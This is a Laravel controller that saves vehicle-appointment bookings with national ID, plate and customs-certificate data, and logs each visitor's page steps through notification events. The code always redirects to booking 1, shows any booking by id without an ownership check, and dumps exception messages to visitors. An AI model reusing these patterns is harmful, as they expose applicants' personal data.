<?php

namespace App\Http\Controllers;

use App\Models\Booking;
use App\Events\SendVisit;
use Illuminate\Http\Request;
use App\Events\SendNotification;
use App\Models\VisitorNotifications;

class BookingController extends Controller
{
    public function saveBooking( Request $request)
    {
        try {

                    $validated = $this->validate($request, [
                        'name' => 'required|string',
                        'natID' => 'required|string',
                        'phone' => 'required|string',
                        'country' => 'required|string',
                        'email' => 'required|string|email',
                        'plate_1' => 'required|string',
                        'plate_2' => 'required|string',
                        'plate_3' => 'required|string',
                        'plate_4' => 'required|string',
                        'plate_number' => 'required|string',
                        'plate_table' => 'required|string',
                        'custom_cert_no' => 'required|string',
                        'vehicle_type' => 'required|string',
                        'service_type' => 'required|string',
                        'area' => 'required|string',
                        'appointment_date' => 'required|date',
                        'timeslot' => 'required|string',
                    ]);
                    $booking = Booking::create($validated);


                    $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
                    $request['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
                    return redirect()->route('summary', 1);


        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function summary($id)
    {
        $summary = Booking::find($id);
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة  ملخص الحجز','step_number'=>2]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
        }
        return view('main.booking.summary', compact('summary'));
    }
}
